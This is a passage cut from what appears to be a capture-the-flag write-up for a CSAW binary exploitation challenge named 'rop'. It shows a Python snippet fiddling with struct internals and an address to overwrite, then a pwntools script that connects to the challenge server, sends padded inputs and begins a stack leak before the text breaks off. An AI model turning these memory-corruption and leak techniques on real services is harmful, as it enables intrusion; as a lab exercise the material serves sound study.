from _struct import Struct
s = Struct.__new__(Struct)
s.__setattr__("format", "HhL")
s.__setattr__("size", 8)
print s.unpack(p64(0x0000008000000000) + '\x00'*6) # Unpack to get the size
print p64(0x0000008000000000 - 8) # Address to overwrite with
```

So we have a leak now. Let's just print the stack and leak whatever we can.

```python
#!/usr/bin/env python
from pwn import *

#r = process('./rop')
r = remote('pwn.chal.csaw.io', 3764)

r.sendlineafter('> ','1')
r.sendlineafter('> ','a'*24)

r.sendlineafter('> ','2')
r.sendlineafter('> ','a'*24)

r.sendlineafter('> ','3')
r.sendlineafter('> ','a'*24)

# Leak stack
r.sendlineafter('> ','4')

